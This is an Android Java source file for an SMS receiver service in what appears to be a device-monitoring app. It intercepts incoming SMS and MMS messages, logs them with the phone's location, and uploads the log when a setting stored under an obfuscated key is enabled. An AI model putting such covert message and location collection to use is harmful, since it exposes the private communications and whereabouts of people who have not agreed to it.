package com.xzfg.app.services;

import android.annotation.TargetApi;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.Location;
import android.os.Build.VERSION_CODES;
import android.os.Bundle;
import android.provider.Telephony.Sms.Intents;
import android.support.v13.BuildConfig;
import android.telephony.SmsMessage;
import android.util.Log;

import com.xzfg.app.Application;
import com.xzfg.app.Givens;
import com.xzfg.app.R;
import com.xzfg.app.managers.FixManager;
import com.xzfg.app.managers.PhoneLogManager;
import com.xzfg.app.model.SmsMmsMessage;
import com.xzfg.app.security.Fuzz;
import com.xzfg.app.util.SMSUtil;

import java.io.File;

import javax.inject.Inject;



public class SMSReceiverService extends IntentService {
    private static final String TAG = SMSReceiverService.class.getName();

    private static final String ACTION_SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    private static final String ACTION_MMS_RECEIVED = "android.provider.Telephony.WAP_PUSH_RECEIVED";
    private static final String ACTION_MESSAGE_RECEIVED = "net.everythingandroid.smspopup.MESSAGE_RECEIVED";
    private static final String MMS_DATA_TYPE = "application/vnd.wap.mms-message";

    public static final String MESSAGE_SENT_ACTION = "com.android.mms.transaction.MESSAGE_SENT";

    /*
     * This is the number of retries and pause between retries that we will keep checking the system
     * message database for the latest incoming message
     */
    private static final int MESSAGE_RETRY = 8;
    private static final int MESSAGE_RETRY_PAUSE = 1000;

    private Context context;
    private int mResultCode;
    private boolean serviceRestarted = false;

    private static final int TOAST_HANDLER_MESSAGE_SENT = 0;
    private static final int TOAST_HANDLER_MESSAGE_SEND_LATER = 1;
    private static final int TOAST_HANDLER_MESSAGE_FAILED = 2;
    private static final int TOAST_HANDLER_MESSAGE_CUSTOM = 3;

    @Inject
    Application application;

    @Inject
    FixManager fixManager;

    @Inject
    PhoneLogManager phoneLogManager;

    @Inject
    SharedPreferences sharedPreferences;

    public SMSReceiverService() {
        super(TAG);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        context = getApplicationContext();
        ((Application) getApplication()).inject(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        serviceRestarted = false;
        if ((flags & START_FLAG_REDELIVERY) != 0) {
            serviceRestarted = true;
        }
        return super.onStartCommand(intent, flags, startId);
    }

    /**
     * Be careful about logging here. An exception in this class could cause
     * and infinte loop --- SO DON'T USE Timber.e() HERE!
     */
    @Override
    protected void onHandleIntent(Intent intent) {
        if (BuildConfig.DEBUG)
            Log.v(TAG, "doWakefulWork()");

        mResultCode = 0;
        if (intent != null && !serviceRestarted) {
            mResultCode = intent.getIntExtra("result", 0);
            final String action = intent.getAction();
            final String dataType = intent.getType();

            if (ACTION_SMS_RECEIVED.equals(action)) {
                handleSMSReceived(intent);
            } else if (ACTION_MMS_RECEIVED.equals(action) && MMS_DATA_TYPE.equals(dataType)) {
                handleMMSReceived(intent);
            } else if (MESSAGE_SENT_ACTION.equals(action)) {
                handleSMSSent(intent);
            } else if (ACTION_MESSAGE_RECEIVED.equals(action)) {
                handleMessageReceived(intent);
            }
        }

    }

    /**
     * Handle receiving a SMS message
     */
    @TargetApi(VERSION_CODES.KITKAT)
    private void handleSMSReceived(Intent intent) {
        if (BuildConfig.DEBUG)
            Log.v(TAG, "Intercept SMS");

        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            SmsMessage[] messages = null;
            if (SMSUtil.hasKitKat()) {
                messages = Intents.getMessagesFromIntent(intent);
            } else {
                messages = SMSUtil.getMessagesFromIntent(intent);
            }
            if (messages != null) {
                logMessageReceived(new SmsMmsMessage(context, messages, System.currentTimeMillis()));
            }
        }
    }

    private void logMessageReceived(SmsMmsMessage message) {

        // Unknown sender and empty body, ignore
        if (context.getString(android.R.string.unknownName).equals(message.getContactName())
                && "".equals(message.getMessageBody())) {
            return;
        }

        //Create text file and log message
        updateLog((message));
    }

    /**
     * Handle receiving a MMS message
     */
    private void handleMMSReceived(Intent intent) {
        if (BuildConfig.DEBUG)
            Log.v(TAG, "MMS received!");
        SmsMmsMessage mmsMessage = null;
        int count = 0;

        // Ok this is super hacky, but fixes the case where this code
        // runs before the system MMS transaction service (that stores
        // the MMS details in the database). This should really be
        // a content listener that waits for a while then gives up...
        while (mmsMessage == null && count < MESSAGE_RETRY) {

            mmsMessage = SMSUtil.getMmsDetails(context);

            if (mmsMessage != null) {
                if (BuildConfig.DEBUG)
                    Log.v(TAG, "MMS found in content provider");
                logMessageReceived(mmsMessage);
            } else {
                if (BuildConfig.DEBUG)
                    Log.v(TAG, "MMS not found, sleeping (count is " + count + ")");
                count++;
                try {
                    Thread.sleep(MESSAGE_RETRY_PAUSE);
                } catch (InterruptedException e) {
                    // e.printStackTrace();
                }
            }
        }
    }

    /**
     * Handle receiving an arbitrary message (potentially coming from a 3rd party app)
     */
    private void handleMessageReceived(Intent intent) {
        if (BuildConfig.DEBUG)
            Log.v(TAG, "Intercept Message");

        Bundle bundle = intent.getExtras();

        /*
         * FROM: ContactURI -or- display name and display address -or- display address MESSAGE BODY:
         * message body TIMESTAMP: optional (will use system timestamp)
         *
         * QUICK REPLY INTENT: REPLY INTENT: DELETE INTENT:
         */

        if (bundle != null) {

            // notifySmsReceived(new SmsMmsMessage(context, messages, System.currentTimeMillis()));
        }
    }


    /*
     * Handle the result of a sms being sent
     */
    private void handleSMSSent(Intent intent) {
        if (BuildConfig.DEBUG)
            Log.v(TAG, "Handle SMS sent");
    }

    private void updateLog(SmsMmsMessage message){
        Location location = fixManager.getLastLocation();
        String direction = getString(R.string.log_incoming);
        File logFile = SMSUtil.updateSMSLog(message, application, direction, location);

        String settingsPhoneCalls = Fuzz.en(Givens.COLLECT_SMS_DELIVERY_KEY, application.getDeviceIdentifier());
        if (sharedPreferences.contains(settingsPhoneCalls)) {
            int collectRecordCalls = sharedPreferences.getInt(settingsPhoneCalls, 0);
            if (collectRecordCalls==1 && logFile!=null) {
                phoneLogManager.submitFile(logFile);
            }
        }
    }
}
